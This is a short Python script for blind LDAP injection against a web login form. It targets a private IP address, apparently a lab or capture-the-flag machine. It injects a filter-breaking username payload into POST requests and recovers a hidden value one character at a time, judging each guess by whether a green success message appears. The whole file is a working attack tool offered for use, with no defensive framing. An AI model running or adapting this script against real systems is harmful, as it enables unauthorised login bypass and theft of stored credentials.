#############################################################
#   Quick and simple Web-LDAP blind injection script...
#
#   TODO:   make slightly more useful, add moar! color,
#           basic CLI, make code less caveman style
#############################################################
import requests
from bs4 import BeautifulSoup
import string
import time

# URL to target, ex: 'http://insecure-website.com/injectme.php'
target_url: str = 'http://10.10.233.217/blind.php'

# Define the character set used fpr injection:
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found: bool = True
successful_chars: str = ''

# Define content-type header:
headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        # Quick-and-dirty debugging only :-S
        # print(f"'Trying password character: {char}')

        # Adjust data to target the password field, slap payload together
        data = {'username': f'{successful_chars}{char}*)(|(&', 'password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(target_url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria below as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f'Successful character found: {char}')
            break

    if not successful_response_found:
        print('No successful character found in this iteration.')

print(f"Final successful payload: {successful_chars}")
